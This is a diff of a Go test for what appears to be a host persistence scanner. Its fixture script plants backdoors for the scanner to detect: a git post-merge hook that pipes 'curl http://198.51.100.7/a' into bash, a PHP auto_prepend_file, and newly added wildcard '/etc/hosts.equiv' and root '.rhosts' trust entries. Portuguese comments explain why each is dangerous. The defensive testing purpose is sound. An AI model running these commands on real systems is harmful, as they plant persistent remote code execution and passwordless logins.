@@ -732,11 +732,19 @@ func init() {
 			printf '#!/bin/sh\ncurl -s http://198.51.100.7/a | bash\n' > /srv/app/.git/hooks/post-merge
 			chmod +x /srv/app/.git/hooks/post-merge
 			printf 'auto_prepend_file = /var/www/.init.php\n' > /etc/php/8.2/fpm/php.ini
+			# host-based trust: o backdoor de acesso mais antigo do Unix. O ` + `
+			# no hosts.equiv confia em QUALQUER host e QUALQUER usuário — login
+			# sem senha de qualquer lugar. O .rhosts de root nomeia um host: raro
+			# em sistema moderno, mas não é irrestrito, então sai como aviso.
+			printf '+\n' > /etc/hosts.equiv
+			printf 'buildserver.interno\n' > /root/.rhosts
 			sleep 0.2`,
 		Expect: []Expect{
 			// domínio de ATUALIZAÇÃO: quem controla para onde ele aponta
 			// controla o que o host instala
 			{ID: "persist.hosts_override", Sev: "CRITICAL", Subject: "deb.debian.org"},
+			// o `+` do hosts.equiv é login sem senha de QUALQUER lugar: CRÍTICO
+			{ID: "persist.host_trust", Sev: "CRITICAL", Subject: "/etc/hosts.equiv"},
 			// certificado ilegível continua sendo achado: a presença é o fato
 			{ID: "persist.ca_planted", Evidence: "PRESENÇA"},
 			// hook de git sobrevive ao redeploy e não mora em /etc
